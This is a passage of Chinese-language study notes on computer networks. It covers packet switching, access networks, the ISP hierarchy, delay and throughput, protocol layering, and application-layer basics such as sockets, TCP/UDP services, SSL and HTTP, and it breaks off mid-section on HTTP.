multiplexing，STDM）</strong>：</p><p>这个概念很像时分多路复用（TDM），区别在于：由于每个分组的传输时间不同，因此对于带宽无绝对的时间划分方式（每个时隙是不同的）。</p><p><strong>同样的网络资源，分组交换网络较电路交换网络允许更多的用户使用</strong>。</p><h4 id="存储-转发"><a href="#存储-转发" class="headerlink" title="存储-转发"></a>存储-转发</h4><p>分组的存储转发一段一段从源端到目标端，按照有无网络层的连接可分为两种：</p><ul><li>数据报（datagram）网络</li><li>虚电路（virtual circuit）网络</li></ul><p>数据报网络：</p><ul><li>在通信之前无需建立连接，一有数据就传输。</li><li>每一个分组都独立路由（路径不一样，可能会失序）。</li><li>源主机发送给目标主机的分组，携带了目标主机的完整地址，路由器根据分组的目标地址进行路由。</li><li>路由器不会维护主机间的通讯状态。</li></ul><p>虚电路网络：</p><ul><li>在通信之前，主机间需要先通过信令建立连接，分组传输路径保持不变。</li><li>每个分组都带标签（虚电路标识VCID），标签决定了下一个跳转。</li><li>路由器会维持每个呼叫的状态信息。</li></ul><h2 id="接入网和物理媒体"><a href="#接入网和物理媒体" class="headerlink" title="接入网和物理媒体"></a>接入网和物理媒体</h2><p>将端系统和边缘路由器连接的方式可以分为三类：住宅接入网络；单位接入网络（学校、公司）；无线接入网络。</p><pre><code>注意接入网络的带宽分为：共享；专用。（比如：有一个接入住宅大楼的网络是专用的，分发到每个住户的网络是共享这一接入网的。）</code></pre><h3 id="接入网"><a href="#接入网" class="headerlink" title="接入网"></a>接入网</h3><ol><li>住宅接入：</li></ol><ul><li><p>调制解调器（moden）：将上网数据调制加载音频信号上，在电话线上传输，在局端将其中的数据解调出来，接入网络核心；反之亦然。</p><p>  拨号调制解调器：56kbps的速率直接接入路由器（通常更低）。不能同时上网和打电话。</p></li><li><p>DSL（digital subscriber line）：采用现存的到交换局DSLAM的电话线。</p><pre><code>  依然采用调制解调的方式  带宽其中0k~4k的部分用于传播语音，其他的部分分为上行和下行数据传输（通常下行速度更大，称为ADSL（非对称））  DSL线路上的数据被传到互联网  DSL线路上的语音被传到电话网  小于2.5Mbps上行传输速率（typically &lt; 1 Mbps）  小于24Mbps下行传输速率（typically &lt; 10 Mbps）</code></pre></li><li><p>线缆网络：有线电视信号线缆双向改造。（利用电视线传输）</p><pre><code>  带宽其中一部分用于传播电视信号，其他的部分分为上行和下行数据传输。  FDM：在不同频段传输不同信道的数据，数字电视和上网数据（上、下行）。  HFC（hybrid fiber coax，混合光纤同轴网）：光纤传输系统与同轴电缆分配网相结合。（非对称：最高30Mbps下行传输速率，2Mbps上行传输速率）  线缆和光纤网络：将各个家庭用户接入到ISP路由器。  各用户共享到线缆头端的接入网络。（注意与DSL不同，DSL中每个用户都有一个专用的线路到CO（central office））</code></pre></li><li><p>电缆模式</p></li><li><p>家庭网络</p></li></ul><ol start="2"><li><p>企业接入网络：</p><p> 经常被企业或者大学等机构采用（10Mbps、100Mbps、1Gbps、10Gbps传输率。现在，端系统经常直接接到以太网络交换机上）</p></li><li><p>无线接入网络：</p><p> 各无线端系统共享无线接入网络（端系统到无线路由器）</p><pre><code> 无线LANs（建筑物内部） 广域无线接入</code></pre></li></ol><h3 id="物理媒体"><a href="#物理媒体" class="headerlink" title="物理媒体"></a>物理媒体</h3><blockquote><p>   几个概念：</p><pre><code>  bit：在发送-接受对间传播  物理链路：连接每个发送-接受对之间的物理媒体  导引型媒体（看得见、摸得着）：信号沿着固体媒介被引导。（eg：同轴电缆、光纤、双绞线）  非导引型媒体（看不见）：开放的空间传输电磁波或者光 信号，在电磁或者光信号中承 载数字数据。</code></pre></blockquote><p>双绞线、同轴电缆、光纤（导引型媒体）<br>无线链路（非导引型媒体）</p><h2 id="Internet结构和ISP"><a href="#Internet结构和ISP" class="headerlink" title="Internet结构和ISP"></a>Internet结构和ISP</h2><p>ISP：Internet Service Provider</p><p>任何一个端系统都是通过接入ISP接入网络，因此就会有很多ISP。由于网络用户数量非常之多，因此也会有许多ISP，ISP必须是互联的，只有这样端系统之间才可以通信。那么ISP之间是如何互联的？</p><p>有一种办法是将他们<strong>两两互联</strong>，但是这会存在一个问题：ISP数量非常之多，在数量达到一定的情况下，再增添一个ISP所耗费的成本会非常巨大，整个体系的性能也会下降。因此这个方法并不可行，我们称其为：<strong>不可扩展</strong>。</p><p>当意识到这点之后，人们就会想到利用一个<font color=HotPink>global ISP</font>作为“桥梁”，来将各个接入ISP连接起来。</p><p>一个global ISP可以完成“桥梁”的工作，很明显这种做法一定是有利可图的，所以为了不让其出现垄断的局面（垄断总是不好的），所以这时一定会有其他的ISP来参与竞争（如图：部分接入网连接ISP A，部分连入ISP B…）。</p><p>有竞争必然也有合作，运营商们可以互相商量，给彼此提供一个接口，这样所有的客户端就都可以相互通信。</p><blockquote><p>   ISP之间连接方式有两种：</p></blockquote><blockquote><pre><code>   直接连接（peering link）   通过IXP（Internet exchange point，网络交换点）来连接</code></pre></blockquote><p>接下来该种通信业务就会细分，出现所谓的区域性网络，他们可以更加方便地为某一地区提供通信服务，同时将与之接入的边缘ISP接入到全局的ISP。</p><p>然后内容提供商网络（Internet Content Providers，ICP，例：Google，Microsoft），可能会构建他们自己的网络，将它们的服务、内容更 加靠近端用户，向用户提供更好的服务,减少自己的运营支出。</p><p>至此，整个网络体系就构成了当今的局面，即网络的网络。</p><h3 id="Internet结构"><a href="#Internet结构" class="headerlink" title="Internet结构"></a>Internet结构</h3><p>是一个具有层次的结构：</p><ol><li>第一层ISP（中心）：国家&#x2F;国际覆盖，速率极高。（如UUNet, BBN&#x2F;Genuity, Sprint, AT&amp;T）</li></ol><ul><li>直接与其他第一层ISP相连</li><li>与大量的第二层ISP和其他客户网络相连</li><li>通过Peer或IXP连接</li></ul><ol start="2"><li>第二层ISP：更小些的 (通常是区域性的) ISP。</li></ol><ul><li><pre><code>   与一个或多个第一层ISPs连接，也可能与其他第二层ISP相连。</code></pre></li><li><pre><code>   通过Peer或IXP连接</code></pre></li></ul><ol start="3"><li>第三层ISP与其他本地ISP： 接入网 (与端系统最近)</li></ol><h2 id="分组延时、丢失和吞吐量"><a href="#分组延时、丢失和吞吐量" class="headerlink" title="分组延时、丢失和吞吐量"></a>分组延时、丢失和吞吐量</h2><p>分组丢失和延时发生的原因：分组在传输过程中，会在路由器的缓冲区形成分组队列，分组等待排到队头，就会被传输至下一节点。这一排队过程就会产生排队延时（还有其他的延时，后面会详细提到）。如果缓冲区容纳不下被传输来的分组（队列容量不够），就会发生分组丢失的现象。</p><h3 id="分组延时"><a href="#分组延时" class="headerlink" title="分组延时"></a>分组延时</h3><ol><li>节点处理延时（nodal processing delay）：节点在收到分组时，为处理分组所花费的时间。</li></ol><ul><li><pre><code>   检查bit级差错</code></pre></li><li><pre><code>   检查分组首部和决定将分组导向何处</code></pre></li><li><pre><code>   微秒级</code></pre></li></ul><ol start="2"><li>排队延时（queuing delay）：分组在节点中排队等待被发送所花费的时间。</li></ol><ul><li><pre><code>   时间长短依赖于路由的拥塞程度（是不确定的）</code></pre></li><li><pre><code>   毫秒-微秒级</code></pre></li></ul><ol start="3"><li>传输延时（transmission delay）：数据从节点进入到传输媒体所耗费的时间。</li></ol><ul><li><pre><code>   R = 链路带宽（bps）</code></pre></li><li><pre><code>   L = 分组长度（bits）</code></pre></li><li><pre><code>   将分组发送到链路上的时间：T = L/R</code></pre></li></ul><ol start="4"><li>传播延时（propagation delay）：数据（电磁波）在物理信道上传输一定距离所耗费的时间。</li></ol><ul><li><pre><code>   d = 物理链路的长度</code></pre></li><li><pre><code>   s = 数据信号在介质上传播的速度（约为2×108 m/sec）</code></pre></li><li><pre><code>   传播延时：T = d/s</code></pre></li></ul><p>下面以车队的例子来类比：</p><p>延时小结：</p><p>排队延时取决于流量强度：</p><blockquote><pre><code>   R = 链路带宽 (bps)   L = 分组长度 (bits)   a = 分组到达队列的平均速率</code></pre></blockquote><p>流量强度 &#x3D; La&#x2F;R</p><blockquote><pre><code>   La/R ~ 0: 平均排队延时很小   La/R -&gt; 1: 延时变得很大   La/R &gt; 1: 比特到达队列的速率超过了从该队列输出的速率，平均排队延时将趋向无穷大！   注意：设计系统时流量强度不能大于1，会导致分组丢失！</code></pre></blockquote><p>Traceroute 诊断程序: 提供从源端，经过路 由器，到目的的延时测量。</p><ul><li><p>沿着目的的路径，向每个路由器发送3个探测分组</p></li><li><p>路由器 i 将向发送方返回一个分组</p></li><li><p>发送方对发送和回复之间间隔计时</p></li></ul><blockquote><pre><code>   Traceroute具体实现原理：   利用了ICMP（Internet Control Message Protocol，互联网控制报文协议）。这种协议下的报文数据IP头部有一个字段：TTL（Time to Live，生存时间）字段。这个字段在最初传输时会被赋值，每经过一个路由器时，TTL减1。当TTL在某一个路由器降为零时，该分组会被抛掉，并会向源主机发送一个ICMP报文——通知源主机：分组发送到该路由时被“干掉”了（并附带IP地址），所以实现每一跳的查询方式就是设置不同的TTL。当分组到达目标主机时，肯定会占用一个端口，但是在目标主机中该端口并没有进程在跑，于是目标主机就会向源主机发送另一种ICMP报文——通知源主机：分组在我这边由于目标端口不可达，“挂掉了”（并附带IP地址）。这就是具体的工作原理。</code></pre></blockquote><pre><code>例子：    上图在第7步和第8步延时出现了陡增的情况，很有可能是跨洋链路（该段链路特别长）</code></pre><h3 id="吞吐量（Throughput）"><a href="#吞吐量（Throughput）" class="headerlink" title="吞吐量（Throughput）"></a>吞吐量（Throughput）</h3><p>在源端和目标端之间传输的速率（数 据量&#x2F;单位时间）</p><ul><li><p>瞬间吞吐量: 在一个时间点的速率</p></li><li><p>平均吞吐量: 在一个长时间内平均值</p></li></ul><blockquote><pre><code>   瓶颈链路：端到端路径上，限制端到端吞吐的链路。（短板效应）   主机A到主机B之间的通信链路一定是公用的，我们假设有10个用户在用同一段链路（该链路带宽最小），那么A到B的连接就会占用这最小链路带宽的十分之一。这十分之一带宽就是A到B的瓶颈带宽，是它限制了A到B的吞吐量。</code></pre></blockquote><h2 id="协议层次及服务模型"><a href="#协议层次及服务模型" class="headerlink" title="协议层次及服务模型"></a>协议层次及服务模型</h2><p>网络是一个复杂的系统。一般对于实现复杂的组织与功能的思路就是分模块，把不同的小功能分模块实现，然后总体实现一个复杂庞大的功能。计算机网络功能的实现同样利用这个思路，利用层次化方式实现复杂的网络功能。</p><blockquote><p>   层次化的具体思路：</p><ul><li>将网络复杂的功能分层功能明确的层次，每一层实现了其中一个或一组功能，功能中有其上层可以使用的功能：服务</li><li>本层协议实体相互交互执行本层的协议动作，目的是实现本层功能， 通过接口为上层提供更好的服务</li><li>在实现本层协议的时候，直接利用了下层所提供的服务</li><li>本层的服务：借助下层服务实现的本层协议实体之间交互带来的新功能（上层可以利用的）+ 更下层所提供的服务</li></ul><p>   服务（Service）：低层实体向上层实体提供它们之间的 通信的能力，是通过原语(primitive)来操作的，是垂直关系。</p><p>   协议（protocol）：对等层实体(peer entity)之间在相互通信的过程中，需要遵循的规则的集合，是水平关系。</p><p>   协议和服务的关系：协议需要下层提供的服务才能实现，协议实现的目的是为了向上层提供更好的服务。本层的服务用户只能看见服务而无法看见下面的协议，下面的协议对上面的服务用户是透明的（看不见的）。</p></blockquote><p>一些术语介绍：</p><ul><li><p>实体（entity）：表示任何可发送或接收信息的硬件或软件进程。</p></li><li><p>服务（Service）：低层实体向上层实体提供它们之间的通信的能力。</p></li><li><p>服务访问点 SAP (Services Access Point) ：上层使用下层提供的服务通过层间的接口。</p></li><li><p>原语（primitive）：上层使用下层服务的形式，高层使用低层提供的服务，以及低层向高层提供服务都是通过服务访问原语来进行交互的。</p></li></ul><blockquote><p>一个服务提供者（service provider）可能会向上层用户（service user ）提供不同的服务，提供服务的具体接口就是层间的服务访问点（SAP），服务的具体形式就是原语。</p></blockquote><p>服务的类型：</p><ol><li>面向连接的服务（Connection-oriented Service）：<ul><li>连接(Connection)：两个通信实体为进行通信而建立的一 种结合。</li><li>面向连接的服务通信的过程：建立连接，通信，拆除连接。</li><li>适用范围：对于大的数据块要传输; 不适合小的零星报文。</li><li>特点：保序（也不尽然）。</li></ul></li><li>无连接的服务（Connectionless Service）：两个对等层实体在通信前不需要建 立一个连接，不预留资源；不需要通信双方都是 活跃。<ul><li>特点：不可靠、可能重复、可能失序。</li><li>适用范围：适合传送零星数据。</li></ul></li></ol><p>分层处理和实现复杂系统的好处：</p><ul><li><p>概念化：结构清晰，便于标示网络组件，以及描述其相互关系。（分层参考模型）</p></li><li><p>结构化：模块化更易于维护和系统升级。（改变某一层服务的实现不影响系统中的其他层次）</p></li></ul><blockquote><p>分层也具有有害的地方：分层实现一个功能时，需要不同层次时时交换信息数据，那么整体的效率就会降低。（每一层都要做差错检测）</p></blockquote><p>层具有的功能：</p><ul><li>差错控制（error control）：使得两个对等体（不同端系统中相同的层次）之间的逻辑通信更加可靠。</li><li>流量控制（flow control）：防止发送方淹没接收方。</li><li>分段与重组（segmentation and reassembly）：在发送端将大数据块分割成小数据块，在接收端将小数据块重新组合成原来的大数据块。</li><li>多路复用（multiplexing）：允许多个上层会话共享一个下层连接。</li><li>连接建立（connection setup）：握手。</li></ul><h3 id="Internet协议栈"><a href="#Internet协议栈" class="headerlink" title="Internet协议栈"></a>Internet协议栈</h3><p>从上至下层次划分为：</p><ul><li>应用层（application）：完成应用报文之间的交互。（实现各种网络应用）</li></ul><pre><code>数据单元：**报文（message）**eg：FTP、SMTP、HTTP</code></pre><ul><li>传输层（transport）：实现进程到进程之间的数据传输。</li></ul><pre><code>数据单元：**报文段（segment）**eg：TCP、UDP</code></pre><ul><li>网络层（network）：实现端到端（源主机-目标主机）的以分组为单位的数据传输。</li></ul><pre><code>数据单元：**分组（packet）**；如果是无连接的方式：**数据报（datagram）**eg：IP、routing protocols（路由协议）</code></pre><ul><li>链路层（link）：在相邻网络节点间以帧为单位传输数据。</li></ul><pre><code>数据单元：**帧（frame）**eg：PPP（点对对协议）、802.11(wifi)、Ethernet</code></pre><ul><li>物理层（physical）：在线路上传送bit。（把数字数据转换成物理信号，使其承载于媒体之上）</li></ul><pre><code>数据单元：**位（bit）**    Internet实际上只定义了上三层协议（应用层、传输层、网络层），下面的链路层和物理层被统一为网络接口层。    协议栈不同层中的协议并未实现全覆盖，有些应用可以直接跨层，由更低层的协议实现。</code></pre><p>OSI参考模型</p><p>从上至下层次划分为：</p><ul><li><p>应用层（application）</p></li><li><p>表示层（presentation）：允许应用解释传输的数据。（关心交换数据的格式）</p><p>   表示层的目的是表示出用户看得懂的数据格式,实现与数据表示有关的功能。主要完成数据字符集的转换、数据格式化和文本压缩、数据加密、解密等工作。</p></li><li><p>会话层（session）：数据交换的同步，检查点，恢复。</p></li><li><p>传输层（transport）</p></li><li><p>网络层（network）</p></li><li><p>链路层（data link）</p></li><li><p>物理层（physical）</p><p>   表示层与会话层的功能在TCP&#x2F;IP协议栈中由应用层完成。</p><p>   OSI参考模型包括了体系结构、服务定义和协议规范三级抽象。</p></li></ul><h3 id="封装与解封装"><a href="#封装与解封装" class="headerlink" title="封装与解封装"></a>封装与解封装</h3><p>源主机向目标主机传送报文的真正流程——不断地封装与解封：</p><p>上层报文的传输需要借助层间接口，依托于下层的服务，在不同层加入相应的控制信息，形成本层的数据单元，继续向下传递，直到物理层将每一个bit传送给通信链路（这是封装的过程）。通过链路交换机，底部物理层会还原数据形成链路层的数据单元（帧），链路层查询帧头部的目标MAC地址，并查询该交换机的栈表（或交换表），并决定将帧从哪一个端口放出，接着就交给该端口的网卡，转换成对应物理层的bit，将其释放到通信链路中。通过路由器，先向上传递形成帧，再将帧转换为网络层的数据单元（分组），网络层从分组获取目标的IP信息，并查询网络层的转发表，决定将数据从哪一个网口释放出去，再形成对应的帧向下传递，进而转为bit由物理层将其传输到通信链路。就这样数据不断传输，最后到达目标主机，并不断解封装形成应用层的报文。</p><h1 id="第二章：计算机网络-应用层"><a href="#第二章：计算机网络-应用层" class="headerlink" title="第二章：计算机网络|应用层"></a>第二章：计算机网络|应用层</h1><blockquote><p>互联网层次中，应用层的协议是最多的。</p></blockquote><p>网络应用的原理：网络应用协议的概念和实现方面</p><ul><li>运输层的服务模型（transport-layer service models）</li><li>客户&#x2F;服务器模式（client-server paradigm）</li><li>P2P模式（peer-to-peer paradigm）</li></ul><p>网络应用的实例：互联网流行的应用层协议</p><ul><li>HTTP</li><li>FTP</li><li>SMTP &#x2F; POP3 &#x2F; IMAP</li><li>DNS</li></ul><p>编程：网络应用程序创建:</p><ul><li>socket API &#x2F; E-mail &#x2F; web &#x2F; instant messaging: (QQ), Wechat (即时消息) &#x2F; remote login (远程登录) &#x2F; P2P file sharing (文件共享) &#x2F; multi-user network games (多用户网络游戏) &#x2F; streaming stored video clips (流式存储视频) &#x2F; Social networks (社交网络) &#x2F; voice over IP (IP电话) &#x2F; real-time video conferencing (实时视频会议) &#x2F; grid computing&#x2F;Cloud computing (网格计算&#x2F;云计算)</li></ul><p>创建一个新的网络应用：</p><ul><li><p>编程：</p><ul><li>在不同的端系统上运行（run on different end systems）</li><li>通过网络基础设施提供的服务，应用进程彼此通信（communicate over network）</li><li>例如：Web服务器软件与浏览器软件通信（web server software communicates with browser software）</li></ul></li><li><p>无需为网络核心设备编写程序（no need to write software for networkcore devices）：</p><ul><li>网络核心不会运行用户应用（network core devices do not run user applications）</li><li>网络应用只在端系统上存在 ，快速网络应用开发和部署（applications on end systems allows for rapid app development, propagation）</li></ul></li></ul><h2 id="应用层协议原理（Principles-of-network-applications）"><a href="#应用层协议原理（Principles-of-network-applications）" class="headerlink" title="应用层协议原理（Principles of network applications）"></a>应用层协议原理（Principles of network applications）</h2><p>可能的应用架构：</p><ul><li><p>客户-服务器模式（C&#x2F;S:client&#x2F;server）</p></li><li><p>对等模式（P2P:Peer To Peer）</p></li><li><p>混合体：客户-服务器和对等体系结构</p></li></ul><blockquote><p>  浏览器&#x2F;服务器模式（B&#x2F;S：Brower&#x2F;Server）是C&#x2F;S架构的一种特例</p></blockquote><h3 id="客户-服务器（C-x2F-S）体系结构"><a href="#客户-服务器（C-x2F-S）体系结构" class="headerlink" title="客户-服务器（C&#x2F;S）体系结构"></a>客户-服务器（C&#x2F;S）体系结构</h3><p>服务器：</p><ul><li>一直在运行</li><li>固定的IP地址和周知的端口号（约定）</li><li>服务器是数据中心（包括软件资源，硬件资源，数据资源）</li><li>扩展性差（性能在访问数量达到一定程度时会出现断崖式下跌）</li></ul><p>客户端：</p><ul><li>主动与服务器连接（服务器先运行，客户端后访问）</li><li>与互联网有间歇性的连接</li><li>可能是动态IP地址</li><li>不直接与其他客户端通信</li></ul><h3 id="对等体（P2P）体系结构"><a href="#对等体（P2P）体系结构" class="headerlink" title="对等体（P2P）体系结构"></a>对等体（P2P）体系结构</h3><ul><li><p>（几乎）没有一直运行的服务器</p></li><li><p>任意端系统之间可以进行通信</p></li><li><p>每一个节点既是客户端又是服务器</p><p>   自扩展性：新peer节点带来新的服务能力，当然也带来新的服务请求</p></li><li><p>参与的主机间歇性连接且可以改变IP地址</p><p>   带来的问题就是：难以管理</p></li><li><p>实例：迅雷</p></li></ul><h3 id="C-x2F-S和P2P体系结构的混合体"><a href="#C-x2F-S和P2P体系结构的混合体" class="headerlink" title="C&#x2F;S和P2P体系结构的混合体"></a>C&#x2F;S和P2P体系结构的混合体</h3><p>Skype：</p><ul><li><p>文件（目录）查询：集中式</p><p>   存在一个中心服务器</p></li><li><p>文件分发（传输）：P2P</p><p>   客户端连接可以不通过服务器直接连接</p></li></ul><p>即时通讯（以QQ为例）：</p><ul><li>两个用户之间的聊天是P2P方式</li><li>当用户上线时，向中心服务器注册其IP地址</li><li>用户通过中心服务器找到好友IP地址</li></ul><h2 id="进程通信（Processes-communicating）"><a href="#进程通信（Processes-communicating）" class="headerlink" title="进程通信（Processes communicating）"></a>进程通信（Processes communicating）</h2><p><strong>进程：在主机上运行的应用程序</strong></p><p>进程间的通信：</p><ul><li><p>在同一个主机内：使用进程间通信机制通信（ 操作系统定义），无需协议。</p></li><li><p>在不同主机内：通过交换报文（Message）来通信。</p><ul><li>使用OS提供的通信服务</li><li>借助传输层提供的服务，按照应用协议交换报文</li></ul></li></ul><blockquote><pre><code>   客户端进程：发起通信的进程   服务器进程：等待连接的进程   注意：P2P架构的应用也有客户端进程和服务器进程之分</code></pre></blockquote><p>分布式进程通信需要解决的问题：</p><ul><li>问题1：进程标识（自身）和寻址（让对方找得到自己）问题。</li><li>问题2：传输层-应用层是如何提供通信服务。<ul><li>位置：层间界面的SAP（TCP&#x2F;IP ：socket）</li><li>形式：应用程序接口API（TCP&#x2F;IP ：socket API）</li></ul></li><li>问题3：：如何使用传输层提供的服务，实现应用进程间的报文交换，实现应用。<ul><li>定义应用层协议：报文格式，解释，时序等</li><li>编制程序，使用OS提供的API ，调用网络基础设施提供通信服务传报文，实现应用时序等；</li></ul></li></ul><ol><li>问题1：对进程进行编址：</li></ol><ul><li><p>进程为了接收报文，必须有一个标识，即：SAP（当然发送也需要标识）</p><pre><code>  主机IP：唯一的32位IP地址（仅仅有IP地址不能够唯一标示一个进程；在一台端系统上有很 多应用进程在运行）  所采用的传输层协议：TCP or UDP  端口号（Port Numbers）  一些知名端口号的例子：HTTP: TCP 80 Mail: TCP 25  TCP和UDP的端口号是不同的</code></pre></li><li><p>一个进程用IP地址和端口号（port）标识。</p></li><li><p>本质上，两个主机进程之间的通信是由2个端节点（end point）构成</p></li></ul><ol start="2"><li>问题2：传输层-应用层提供的服务：</li></ol><ul><li><p>层间接口必须要携带的信息（3类）</p><ul><li>要传输的报文（对于本层来说就是SDU）</li><li>谁传递的信息：本方应用进程的标识，即本方IP+TCP(UDP) 端口</li><li>信息要传递给谁：对方应用进程的标识，即对方IP+TCP(UDP) 端口</li></ul></li><li><p>传输层实体（tcp或者udp实体）根据这些信息进行TCP报文段（UDP报文段）的封装</p><ul><li>源端口号，目标端口号，数据等</li><li>将IP地址往下交IP实体，用于封装IP数据报：源IP,目标IP</li></ul></li></ul><h2 id="Socket（套接字）"><a href="#Socket（套接字）" class="headerlink" title="Socket（套接字）"></a>Socket（套接字）</h2><p><strong>进程通过套接字发送或接受报文。</strong></p><p>可以把套接字比作一道门。发送进程将报文推出门户，发送进程依赖于传输层设施在另外一侧的门将报文交付给接收进程，同样的，接收进程从另外一端的门户收到报文（依赖于传输层设施）</p><blockquote><p>   传输层提供的服务-层间信息的代表：</p><p>   层间建立连接后需要传输大量的信息，如果Socket API 每次传输报文，都携带如此多的信息，太繁琐易错，不便于管理。为了解决这个问题，出现了Socket（套接字，实际上就是用<strong>一个整数表示两个应用实体之间的通信关系</strong> ，是一个本地标识）。</p></blockquote><ul><li>TCP之上的套接字：</li></ul><pre><code>对于使用面向连接服务（TCP）的应用而言，套接字是4元组的一个具有本地意义的标识。    4元组：源IP，源port，目标IP，目标port    唯一的指定了一个会话（2个进程之间的会话关系）    应用使用这个标示，与远程的应用进程通信    不必在每一个报文的发送都要指定这4元组    简单，便于管理</code></pre><ul><li>UDP之上的套接字：</li></ul><pre><code>（由于UDP服务下的进程通信前不需要连接，前后报文都是独立传输的，且可能传输给不同的分布式进程。所以只能用一个整数表示本应用实体的标识。）对于使用无连接服务（UDP）的应用而言，套 接字是2元组的一个具有本地意义的标识。    2元组：源IP，源port    UDP套接字指定了应用所在的一个端节点（end point）    在发送数据报时，采用创建好的本地套接字（标识 ID），就不必在发送每个报文中指明自己所采用的 ip和port    但是在发送报文时，必须要指定对方的ip和udp port(另外一个端节点)</code></pre><ol start="3"><li><p>问题3：如何使用传输层提供的服务实现应用</p><p> 定义应用层协议：报文格式，解释，时序等<br> 编制程序，通过API调用网络基础设施提供通信 服务传报文，解析报文，实现应用时序等</p></li></ol><p>应用层协议：</p><p>该协议定义了：运行在不同端系统上的应用进程如何相互交换报文。（仅仅规范了两个进程在通信中需要遵守的规则）</p><ul><li><p>交换的报文类型：请求和应答报文</p></li><li><p>各种报文类型的语法：报文中的各个字段及其描述</p></li><li><p>字段的语义：即字段取值的含义</p></li><li><p>进程何时、如何发送报文及对报文进行响应的规则</p><blockquote><p>应用协议仅仅是应用的一个组成部分。一个应用还包括用户界面，本地I&#x2F;O操作，业务逻辑等</p></blockquote></li><li><p>公开协议：</p><ul><li><p>由RFC文档定义</p></li><li><p>允许互操作</p></li><li><p>举例：HTTP、SMTP</p></li></ul></li><li><p>私有协议（不公开）：例如：SKype、QQ、wechat</p></li></ul><p>应用需要传输层提供的服务：</p><ul><li>数据丢失率（Data loss）：</li></ul><pre><code>有些应用则要求100%的可靠数据传输（如文件），有些应用（如音频）能容忍 一定比例以下的数据丢失</code></pre><blockquote><pre><code>   实际上在看视频时是会有丢帧的情况，我们无法察觉的原因是因为采用了一些掩盖技术：   比如第二帧的画面丢失，可以选择重放第一帧或第三帧，也可以计算并播放第一、三帧求和后取均值。</code></pre></blockquote><ul><li><p>延迟（Timing）：</p><p>   一些应用出于有效性考虑，对数据传输有严格的时间限制（如：Internet 电话、交互式游戏）</p></li><li><p>吞吐（Throughput）</p><p>   一些应用（如多媒体应用）必须需要最小限度的吞吐，从而使得应用能够有效运转。一些应用能充分利用可供使用的吞吐(“弹性应用”)</p></li><li><p>安全性（Security）</p><p>   机密性、数据完整性、可认证性（鉴别）…</p></li></ul><blockquote><p>下表是一些常见应用对传输服务的要求：</p></blockquote><table><thead><tr><th>应用</th><th>数据丢失率</th><th>吞吐</th><th>时间敏感性</th></tr></thead><tbody><tr><td>文件传输</td><td>不能丢失</td><td>弹性</td><td>不</td></tr><tr><td>E-mail</td><td>不能丢失</td><td>弹性</td><td>不</td></tr><tr><td>Web 文档</td><td>不能丢失</td><td>弹性</td><td>不</td></tr><tr><td>实时音视频</td><td>容忍丢失</td><td>音频： 5kbps-1Mbps 视频：10kbps-5Mbps</td><td>是，100ms</td></tr><tr><td>存储音视频</td><td>容忍丢失</td><td>音频： 5kbps-1Mbps 视频：10kbps-5Mbps</td><td>是，几秒</td></tr><tr><td>交互式游戏</td><td>容忍丢失</td><td>几kbps ~10kbps</td><td>是，100ms</td></tr><tr><td>即时讯息</td><td>不能丢失</td><td>弹性</td><td>是和不是</td></tr></tbody></table><p>Internet传输层提供的服务：</p><ul><li><p>TCP服务：</p><ul><li>可靠的传输服务（不出错、不丢失、不乱序）</li><li>流量控制：发送方不会淹没接受方</li><li>拥塞控制：当网络出现拥塞时，能抑制发送方</li><li>不能提供的服务：延时保证、最小吞吐（带宽）保证和安全性</li><li>面向连接：要求在客户端进程和服务器进程之间建立连接</li></ul></li><li><p>UDP服务：</p><ul><li><p>不可靠数据传输</p></li><li><p>不提供的服务：可靠， 流量控制、拥塞控制、 延时、带宽保证、不建立连接</p></li></ul><blockquote><p>UDP存在的必要性：</p><ul><li><p>能够区分不同的进程，而IP服务不能。（在IP提供的主机到主机&#x2F;端到端功能的基础上，区分了主机的 应用进程）</p></li><li><p>无需建立连接：省去了建立连接时间，适合事务性的应用</p></li><li><p>不做可靠性的工作：例如检错重发，适合那些对实时性要求比较高而对正确性要求不高的应用。（实现可靠性是必须要付出时间代价的）</p></li><li><p>没有拥塞控制和流量控制：应用能够按照设定的速度发送数据。（在TCP上面的应用，应用发送数据的速度和主机向网络发送的实际速度是不一致的，因为有流量控制和拥塞控制）</p></li></ul></blockquote></li></ul><blockquote><p>下表展示了Internet应用及其应用层协议和传输协议</p></blockquote><table><thead><tr><th>应用</th><th>应用层协议</th><th>下层的传输协议</th></tr></thead><tbody><tr><td>E-mail</td><td>SMTP [RFC 2821]</td><td>TCP</td></tr><tr><td>远程终端访问</td><td>Telnet [RFC 854]</td><td>TCP</td></tr><tr><td>Web</td><td>HTTP [RFC 2616]</td><td>TCP</td></tr><tr><td>文件传输</td><td>FTP [RFC 959]</td><td>TCP</td></tr><tr><td>流媒体</td><td>专用协议 (如RealNetworks)</td><td>TCP 或 UDP</td></tr><tr><td>Internet电话</td><td>专用协议 (如Net2Phone)</td><td>TCP 或 UDP</td></tr></tbody></table><p>安全TCP</p><ul><li><p>TCP&amp;UDP</p><ul><li>都没有加密</li><li>明文通过互联网传输 ，甚至密码</li></ul></li><li><p>SSL</p><ul><li>在TCP上面实现，提供加密的TCP连接（https:&#x2F;&#x2F;）</li><li>私密性</li><li>数据完整性</li><li>端到端的鉴别&#x2F;认证</li></ul></li><li><p>SSL在应用层</p><ul><li>应用采用SSL库，SSL库使用TCP通信</li></ul></li><li><p>SSL socket API</p><ul><li>应用通过API将明文交给socket，SSL将其加密在互联网上传输</li></ul></li></ul><h2 id="Web-and-HTTP"><a href="#Web-and-HTTP" class="headerlink" title="Web and HTTP"></a>Web and HTTP</h2><p>一些术语：</p><ul><li><p>Web页：由一些对象组成。（对象可以是HTML文件、JPEG图像、Java小程序、声 音剪辑文件等）</p></li><li><p>Web页含有一个基本的HTML文件，该基本HTML文件又包含若干对象的引用（链接）</p></li><li><p>通过URL对每个对象进行引用</p><p>   包含访问协议，用户名，口令字，端口等；（如下图）</p></li></ul><blockquote><p>   一个网页通常是一个baseHTML文件，这个文件是HTML的形式，浏览器可以解析。其中包含各种对象，但是并不包括对象本身，而是这个对象的引用链接。（浏览器需要判断这个链接，并且去再次访问这个对象链接，从而将对象本身访问到并展示在baseHTML页面上）</p></blockquote><h3 id="HTTP（hypertext-transfer-protocol）：超文本传输协议"><a href="#HTTP（hypertext-transfer-protocol）：超文本传输协议" class="headerlink" title="HTTP（hypertext transfer protocol）：超文本传输协议"></a>HTTP（hypertext transfer protocol）：超文本传输协议</h3><ul><li><p>Web的应用层协议</p></li><li><p>客户&#x2F;服务器模式（C&#x2F;S）</p><p>   客户: 请求、接收和显示 Web对象的浏览器。</p><p>   服务器: 对请求进行响应， 发送对象的Web服务器。</p></li><li><p>使用TCP：</p><ul><li>客户发起一个与服务器的TCP连接 (建立套接字) 